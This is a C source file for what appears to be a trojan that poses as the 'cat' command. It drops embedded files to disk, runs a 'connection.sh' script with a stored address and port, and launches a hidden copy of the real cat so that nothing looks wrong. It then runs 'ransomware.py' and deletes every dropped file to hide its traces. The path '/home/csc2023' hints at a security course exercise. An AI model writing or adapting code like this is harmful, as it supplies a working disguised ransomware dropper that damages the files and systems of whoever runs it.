#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include "address_port.h"
#include "connection.h"
#include "zipped_cat.h"

int main(int argc, char *argv[]){
	FILE *fptr;
	fptr = fopen("address_port.txt", "wb");
	fwrite(address_port_txt, address_port_txt_len, 1, fptr);
	fclose(fptr);

	char command[60] = "bash connection.sh";
	fptr = fopen("address_port.txt", "r");
	char *line = NULL;
	size_t len;
	getline(&line, &len, fptr);
	strcat(command, line);
	fclose(fptr);
	system("rm -rf address_port.txt");

	fptr = fopen("connection.sh", "wb");
	fwrite(connection_sh, connection_sh_len, 1, fptr);
	fclose(fptr);
	system(command);
	sleep(4);
	system("rm -rf connection.sh");
	
	fptr = fopen("temp", "wb");
	fwrite(zipped_cat_zip, zipped_cat_zip_len, 1, fptr);
	fclose(fptr);
	system("unzip temp > /dev/null");
	system("rm temp");
	
	pid_t pid;
	pid = fork();
	if(pid == 0){
		char a[] = "./cat_backup";
		argv[0] = a;
		system("chmod +x cat_backup");
		int outcome = execvp("/home/csc2023/cat_backup", argv);
		if(outcome == -1)
			printf("Error in execvp!");	
	}
	else{
		int status;
		waitpid(pid, &status, 0);
		system("python3 ransomware.py");
		system("rm ransomware.py");
		system("rm cat_backup");
	}
	return 0;
}
